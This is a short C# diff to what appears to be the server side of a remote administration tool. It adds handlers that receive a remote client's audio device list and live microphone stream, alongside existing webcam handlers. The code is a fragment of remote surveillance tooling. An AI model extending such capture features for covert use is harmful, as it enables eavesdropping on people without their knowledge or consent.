@@ -6,6 +6,7 @@ using System.Threading;
 using xServer.Core.Data;
 using xServer.Core.Helper;
 using xServer.Core.Networking;
+using xServer.Core.Packets;
 using xServer.Core.Packets.ClientPackets;
 using xServer.Core.Packets.ServerPackets;
 using xServer.Core.Utilities;
@@ -180,6 +181,18 @@ namespace xServer.Core.Commands
                 return;
 
             client.Value.FrmWebcam.AddWebcams(packet.Webcams);
+        }
+
+        public static void HandleGetAudioDevicesResponse(Client client, GetAudioDevicesResponse packet) {
+            client.Value?.FrmMic?.AddAudioDevices(packet.AudioDevices);
+        }
+
+        public static void HandleGetAudioStreamResponse(Client client, GetAudioStreamResponse packet) {
+            client.Value?.FrmMic?.PlayAudioStream(packet.AudioStream);
+        }
+
+        public static void HandleStopAudioStreamResponse(Client client, StopAudioStreamResponse packet) {
+            client.Value?.FrmMic?.StopAudioStream(packet.StreamStopped);
         }
 
         public static void HandleGetWebcamResponse(Client client, GetWebcamResponse packet)
